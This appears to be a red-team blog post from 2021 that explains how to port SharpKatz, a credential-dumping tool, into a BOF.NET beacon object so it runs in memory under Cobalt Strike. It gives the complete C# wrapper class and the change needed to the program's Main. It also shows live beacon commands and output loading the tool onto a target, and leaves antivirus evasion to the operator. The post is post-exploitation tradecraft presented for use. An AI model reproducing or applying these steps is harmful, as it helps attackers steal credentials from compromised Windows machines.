---
layout: single
title: "A look at BOF.NET, setting up for use with Cobalt Strike"
date: 2021-11-17
tags:  
  - windows
  - bof
  - red-team
  - c#
author_profile: true
---


## Introduction 

BOF.NET is a small native BOF object combined with the BOF.NET managed runtime that enables the development of Cobalt Strike BOFs directly in .NET. BOF.NET removes the complexity of native compilation along with the headaches of manually importing native API

Source : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)


## Porting BOF.NET Classes to SharpKatz

While integrating the BOF.NET dll and writing the class to execute the application as a BOF file would look a little "hard" or messy I tried to keep the walkthrough as simple as possible.

Firstly you can download the DLL from the BOF.NET releases page : [https://github.com/CCob/BOF.NET/releases](https://github.com/CCob/BOF.NET/releases) or build it from the source code if you would like.

Afterwards you would want to Add the `dll` as a Reference to SharpKatz Source Code :

![img1](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof3.png)

I will go on and create a new C# Class file to add it into the SharpKatz code which will contain the BOF.NET custom class

![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof4.png)

This little piece of code basically takes user's arguments and forwards them to the real program's Main() function to avoid hardcoding.

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using BOFNET;

namespace SharpKatz
{
    public class Execute : BeaconObject
    {
        public Execute(BeaconApi api) : base(api) { }
        public override void Go(string[] args)
        {
            try
            {
                // Redirect stdout to MemoryStream
                var memStream = new MemoryStream();
                var memStreamWriter = new StreamWriter(memStream);
                memStreamWriter.AutoFlush = true;
                Console.SetOut(memStreamWriter);
                Console.SetError(memStreamWriter);

                // Run main program passing original arguments
                Program.Main(args);

                // Write MemoryStream to Beacon output
                BeaconConsole.WriteLine(Encoding.ASCII.GetString(memStream.ToArray()));

            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("\nBOF.NET Exception: {0}.", ex));
            }
        }
    }
}
```
Make sure you have also checked the main function name on the existing .NET project (SharpKatz in my example) and that the access modifier is set to public : 

```csharp
namespace SharpKatz
{
    public class Program
    {

        public static void Main(string[] args)
```

It needs to be callable so BOF.NET can be able to forward arguments to the main function.


## Importing BOF.NET to Cobalt Strike

When all that has been set up we can go on and build the project which will output the final `SharpKatz.exe` ready to be used as a BOF file.

Use the CNA script already included in the source code of BOF.NET to load the script on cobalt strike using script manager:

![img4](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof.png)

After grabbing yourself an interactive shell against the target you could try initialising bofnet and loading the BOF file to be executed. NOTE that this tool doesnt have anything to do with AMSI or any other protection as you would have to deal with that on your own. I am using a target with no antivirus defence to show the proof of concept for the tool :

```console
beacon> bofnet_init
[*] Initializing BOFNET
[+] host called home, sent: 490145 bytes
[+] received output:
[+] BOFNET Runtime Initalized, assembly size 483328, .NET Runtime Version: 4.0.30319.42000 in AppDomain BOFNET

beacon> bofnet_load /home/pi0x73/SharpKatz.exe
[*] Attempting to load large .NET assembly /home/pi0x73/SharpKatz.exe into BOFNET
[+] host called home, sent: 740018 bytes
[+] received output:
[+] Setting up new loader with unique id kPgG3dJw
[+] Loaded assembly SharpKatz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null successfully
[=] Assembly has been prepared with Costura|dnMerge, running embedded assembly resolver
```

![gif](https://im4.ezgif.com/tmp/ezgif-4-b95d1727ceb0.gif)
